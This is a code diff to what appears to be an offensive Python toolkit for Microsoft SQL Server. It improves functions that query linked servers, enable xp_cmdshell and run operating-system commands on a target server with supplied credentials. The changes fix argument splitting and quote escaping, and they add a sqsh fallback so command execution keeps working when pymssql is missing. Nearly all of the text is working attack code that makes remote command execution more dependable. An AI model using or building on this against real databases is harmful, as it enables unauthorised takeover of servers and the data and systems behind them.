@@ -1,3 +1,4 @@
+import shlex
 import subprocess
 from typing import Any, Dict, List
 
@@ -30,7 +31,9 @@ def mssql_linked_server_query(host: str, user: str, password: str,
         ]
         for cmd in cmds:
             try:
-                r = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=15)
+                # shlex.split 保留引号语义; 裸 split() 会把 "SELECT @@VERSION"
+                # 撕成多段导致查询/含空格密码损坏.
+                r = subprocess.run(shlex.split(cmd), capture_output=True, text=True, timeout=15)
                 if r.returncode == 0 and r.stdout.strip():
                     result["success"] = True
                     result["rows"] = [l.strip() for l in r.stdout.split("\n") if l.strip()][:20]
@@ -62,7 +65,7 @@ def mssql_enable_xp_cmdshell(host: str, user: str, password: str) -> Dict:
         ]
         for cmd in cmds:
             try:
-                r = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=15)
+                r = subprocess.run(shlex.split(cmd), capture_output=True, text=True, timeout=15)
                 result["success"] = r.returncode == 0
             except Exception:
                 continue
@@ -77,17 +80,29 @@ def mssql_cmdshell(host: str, user: str, password: str,
     enable = mssql_enable_xp_cmdshell(host, user, password)
     if not enable["success"]:
         return result
+    safe_command = command.replace("'", "''")
     try:
         import pymssql
         conn = pymssql.connect(host=host, user=user, password=password, timeout=5)
         cursor = conn.cursor()
-        cursor.execute(f"EXEC xp_cmdshell '{command}'")
+        cursor.execute(f"EXEC xp_cmdshell '{safe_command}'")
         for row in cursor.fetchall():
             val = row[0]
             if val:
                 result["output"] += str(val) + "\n"
         conn.close()
         result["success"] = bool(result["output"])
+    except ImportError:
+        # 无 pymssql 时用 sqsh 回退执行命令 (旧逻辑 enable 走 sqsh 成功,
+        # 执行却必报 ImportError, 命令执行能力整体丢失).
+        cmd = f"sqsh -S {host} -U {user} -P {password} -C \"EXEC xp_cmdshell '{safe_command}'\""
+        try:
+            r = subprocess.run(shlex.split(cmd), capture_output=True, text=True, timeout=20)
+            if r.returncode == 0 and r.stdout.strip():
+                result["output"] = r.stdout[:4000]
+                result["success"] = True
+        except Exception as e:
+            result["error"] = str(e)
     except Exception as e:
         result["error"] = str(e)
     return result
